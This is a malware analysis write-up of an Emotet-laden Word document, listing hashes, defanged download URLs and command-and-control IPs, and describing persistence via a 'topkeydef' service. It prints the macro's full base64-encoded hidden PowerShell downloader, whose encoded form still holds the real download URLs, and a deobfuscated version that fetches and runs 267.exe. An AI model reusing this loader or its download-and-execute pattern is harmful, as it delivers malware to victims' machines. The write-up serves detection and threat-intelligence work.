---
title:   Analysing a Malicious Doc File
classes: wide
header:
  teaser: /img/Emotet.png
ribbon: red
categories:
  - Malware-Analysis
toc: true
---
# EMOTET malware 
The malware classified as an Emotet strain Emotet malware functioned as a banking trojan aimed at stealing banking credentials from infected hosts. Emotet operators updated the trojan and reconfigured it to work primarily as a "loader," a type of malware that gains access to a system, and then allows its operators to download additional payloads.

# Executive Summary 
	
A suspicious word document is found to be embedded with a script which drops the malicious payload into disk. The payload is packed with a custom packer. The malicious script is obfuscated and the dropped payload is packed along with anti-analysis techniques. When dropped, the payload will unpack itself and creates a service to maintain persistence.


# File Information :
## FileName  : REP_89419812646634117.doc
### File type : MS Word Document

### Hash :
   * MD5     : 1D6F0E7E30C1D9E3F64B0D36E602DA50
   * SHA-1   : 895D6DD7F677E45E997B03CEF761FC40E10B22BA
   * SHA-256 : 70B4DBED87A8BE890A088D70057CE44413BF3A65DF5C5C15D049DE0B9C47FF8D
### IoC :
	hxxp[://]amelano[.]net/wp-includes/css/dist/2ew/
	hxxp[://]911concept[.]com/images/i6ngX5/
	hxxp[://]ayonschools[.]com/UBkoqn/
	hxxp[://]beech[.]org/wayne/lldo/
	hxxp[://]firelabo[.]com/wp-includes/mf6f4/

The malicious document contacts these above addresses and drops a executable.



## Dropped File : 267.exe
### File type : Windows Executable

### Hashes 
   * MD5	: F3F48C57C38BFF2DDD220F20569E1EE6
   * SHA-1	: 0421127F1BCCA91A6AB2A570A47F8159101B751A
   * SHA-256	: B1CAD1540ECB290088252635F8E130022EED7486EB128C0CA3D676945D60A9FC
   * SSDEEP	: 3072:iYyIxN7LMWf+GPBLi21ocO2jytUkU4uDQUiysA+30Sor6KH7j0m43ayYZt:GIx5MKQUJkqDDj+xW6KH7IuN

### IoC 
	hxxp[://]203[.]99[.]188[.]203/cone/arizona/ringin/merge/
	hxxp[://]203[.]99[.]187[.]137:443/mult/
	hxxp[://]203[.]99[.]188[.]203:990/cone/arizona/ringin/merge/
	hxxp[://]144[.]76[.]62[.]10:8080/devices/glitch/ringin/
	hxxp[://]70[.]32[.]94[.]58:8080/iplk/health/ringin/merge/

### Command servers :
	203[.]99[.]188[.]203
	203[.]99[.]187[.]137
	70[.]32[.]94[.]58
	144[.]76[.]62[.]10




# Entry : 
Initial infection of target systems often proceeds through a macro virus in an email attachment.


# Capabilities:
   Malware can 
   * Infect Files
   * Persist across reboots
   * Steal Data
   * Communicate with attacker
   * Resist Analysis


# Dependencies :
   * Require administrative privilages to execute
   * Microsoft Word


# Analysis :
   Initial infection of target systems often proceeds through a macro virus in an email attachment. The doc file macro once enabled to in edit mode runs an obfuscated powershell script.
   The Word document consists of obfuscated macro which executes automatically when opened. 
   Macro spawns a hidden powershell wih the following obfuscated code.
   
   
## Powershell spawned from WINWORD.exe :
After opening the document in edit mode a powershell process is spawned.
<p align="center">
<img src=https://user-images.githubusercontent.com/73170547/141808900-87e7ca4f-306d-402f-b1a9-b2dd997fd088.PNG>
</p>


### PowerShell script   
The powershell script ran with following command.

<span style="color:#152AD8">Powershell -w hidden -en</span>
```JABXAGgAaAB2AGQAeAByAGIAcQB3AGwAawBmAD0AJwBBAG8AawBqAHMAdgBuAGcAcgBsAGsAZABrACcAOwAkAEQAYQBiAHcAZwByAGwAcwBjAGIAbgB1AGQAIAA9ACAAJwAyADYANwAnADsAJABXAGkAcwBhAGwAeABuAGcAeQBtAHkAawA9ACcASABmAHIAZABhAHoAagB1AG0AYwBqAGIAcAAnADsAJABQAHEAegBvAHEAeABzAGYAaQA9ACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQARABhAGIAdwBnAHIAbABzAGMAYgBuAHUAZAArACcALgBlAHgAZQAnADsAJABUAGgAdQBwAGEAbwBiAG4AegBuAGMAYgA9ACcARwB3AGMAZwB3AGUAZQBtAGcAZgAnADsAJABSAHQAZwBsAHAAagBiAHUAbAA9ACYAKAAnAG4AJwArACcAZQB3ACcAKwAnAC0AJwArACcAbwBiAGoAZQBjAHQAJwApACAATgBFAFQALgBXAEUAYgBjAGwASQBFAE4AdAA7ACQAWQB6AHUAZABqAGYAbQBrAHkAPQAnAGgAdAB0AHAAOgAvAC8AYQBtAGUAbABhAG4AbwAuAG4AZQB0AC8AdwBwAC0AaQBuAGMAbAB1AGQAZQBzAC8AYwBzAHMALwBkAGkAcwB0AC8AMgBlAHcALwAqAGgAdAB0AHAAOgAvAC8AOQAxADEAYwBvAG4AYwBlAHAAdAAuAGMAbwBtAC8AaQBtAGEAZwBlAHMALwBpADYAbgBnAFgANQAvACoAaAB0AHQAcAA6AC8ALwBhAHkAbwBuAHMAYwBoAG8AbwBsAHMALgBjAG8AbQAvAFUAQgBrAG8AcQBuAC8AKgBoAHQAdABwADoALwAvAGIAZQBlAGMAaAAuAG8AcgBnAC8AdwBhAHkAbgBlAC8AbABsAGQAbwAvACoAaAB0AHQAcAA6AC8ALwBmAGkAcgBlAGwAYQBiAG8ALgBjAG8AbQAvAHcAcAAtAGkAbgBjAGwAdQBkAGUAcwAvAG0AZgA2AGYANAAvACcALgAiAFMAYABQAEwAaQB0ACIAKAAnACoAJwApADsAJABDAHcAcAByAGoAaABjAG8AZQBmAD0AJwBaAGcAZgBzAHIAcQB5AHkAZgBqAGcAZgAnADsAZgBvAHIAZQBhAGMAaAAoACQAUgBmAHgAdgBmAHcAdwBvAGMAeQBjAHcAdwAgAGkAbgAgACQAWQB6AHUAZABqAGYAbQBrAHkAKQB7AHQAcgB5AHsAJABSAHQAZwBsAHAAagBiAHUAbAAuACIAZABPAHcAYABOAEwAYABPAGEAZABGAGAAaQBMAEUAIgAoACQAUgBmAHgAdgBmAHcAdwBvAGMAeQBjAHcAdwAsACAAJABQAHEAegBvAHEAeABzAGYAaQApADsAJABUAGcAbgBoAGEAbwBuAHAAbQBlAHgAaQA9ACcAWQBwAGYAYQBzAGcAaABwAHkAbAB1AHEAJwA7AEkAZgAgACgAKAAuACgAJwBHAGUAdAAnACsAJwAtAEkAdABlACcAKwAnAG0AJwApACAAJABQAHEAegBvAHEAeABzAGYAaQApAC4AIgBMAGUAYABOAEcAdABIACIAIAAtAGcAZQAgADIANQA4ADUAOQApACAAewBbAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAIgBTAGAAVABBAFIAVAAiACgAJABQAHEAegBvAHEAeABzAGYAaQApADsAJABTAHEAawBrAG4AbwB3AGEAdwA9ACcASQBqAHUAYgB2AGoAbQBkAHoAcQBkACcAOwBiAHIAZQBhAGsAOwAkAEEAbwBlAGgAYgBuAGsAaABqAGoAdAA9ACcAWABxAGcAYgBvAGoAdgBjAHkAeAAnAH0AfQBjAGEAdABjAGgAewB9AH0AJABRAGsAZABlAGQAcABwAGsAeABrAHoAawBvAD0AJwBVAGkAeQBhAGEAbQBpAG0AdwB4ACc```

Decoding the script from Base64 and deobfuscating to some extent has given certain URLs which are accessed by the script.



## Deobfuscated Powershell Script: 

    $Whhvdxrbqwlkf='Aokjsvngrlkdk'
    $Dabwgrlscbnud = '267'
    $Wisalxngymyk='Hfrdazjumcjbp'
    $Pqzoqxsfi=$env:userprofile '\' $Dabwgrlscbnud '.exe'
    $Thupaobnzncb='Gwcgweemgf'
    $Rtglpjbul=&('new-object') NET[.]WEbclIENt
    $Yzudjfmky='
    		hxxp[://]amelano[.]net/wp-includes/css/dist/2ew/
    		hxxp[://]911concept[.]com/images/i6ngX5/
    		hxxp[://]ayonschools[.]com/UBkoqn/
    		hxxp[://]beech[.]org/wayne/lldo/
    		hxxp[://]firelabo[.]com/wp-includes/mf6f4/
  
    '."SPLit"(' ')
    $Cwprjhcoef='Zgfsrqyyfjgf'
    foreach($Rfxvfwwocycww in $Yzudjfmky){try{$Rtglpjbul."dOwNLOadFiLE"($Rfxvfwwocycww, $Pqzoqxsfi)
    $Tgnhaonpmexi='Ypfasghpyluq'
    If ((.('Get-Item') $Pqzoqxsfi)."LeNGtH" -ge 25859) {[Diagnostics[.]Process]::"START"($Pqzoqxsfi)
    $Sqkknowaw='Ijubvjmdzqd'
    break
    $Aoehbnkhjjt='Xqgbojvcyx'}}catch{}}$Qkdedppkxkzko='Uiyaamimwx'


The script then drops a packed executable named 267.exe(Dropped exe) into the disk and runs it.



## Process :
The dropped executable ie. 267.exe unpacks itself in the memory and then writes its own process to an executable on the disk named topkeydef.exe which is the same executable(packed 267.exe) renamed. And it adds a service named "topkeydef" to remain persistent when system runs.
<p align="center">
<img src=https://user-images.githubusercontent.com/73170547/141809204-c235f06f-047d-48fa-b385-6f19cf6d2d47.png>
</p>



## Registry Keys: 
 A service is created by topkeydef.exe to maintain persistence on system.
 <p align="center">
<img src=https://user-images.githubusercontent.com/73170547/141810457-270216be-64a8-4d78-8e72-a48308512467.png>
</p>



## Strings :
 Analysing runnning service for IP addresses gives of following which supposedly be command and control servers.
	
	hxxp[://]203[.]99[.]188[.]203/cone/arizona/ringin/merge/
	hxxp[://]203[.]99[.]187[.]137:443/mult/
	hxxp[://]203[.]99[.]188[.]203:990/cone/arizona/ringin/merge/
	hxxp[://]144[.]76[.]62[.]10:8080/devices/glitch/ringin/
	hxxp[://]70[.]32[.]94[.]58:8080/iplk/health/ringin/merge/



# Tools used :
* olevba for macro analysis
* Cyberchef for Deobfuscation
* ProcMon for spawned process information
* IDA for string extraction.


# References:
* [Sample Word Doc analysis at any.run](https://app.any.run/tasks/5f1d489a-34c8-4403-9dc7-727b32986f95/)
* [Dropped File analysis at any.run](https://app.any.run/tasks/6cef02f8-0aa9-428a-9f61-f68ae5a156fb/)










 



